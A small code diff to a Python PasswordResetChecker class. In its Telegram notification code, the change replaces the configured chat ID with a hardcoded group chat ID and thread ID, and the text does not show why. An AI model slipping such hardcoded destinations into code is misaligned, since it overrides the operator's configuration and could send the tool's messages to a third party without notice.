@@ -43,7 +43,8 @@ class PasswordResetChecker:
         try:
             url = f"https://api.telegram.org/bot{self.telegram_bot_token}/sendMessage"
             payload = {
-                "chat_id": self.telegram_chat_id,
+                "message_thread_id": "6173",
+                "chat_id": "-1002646331785", 
                 "text": message,
                 "parse_mode": "HTML"
             }
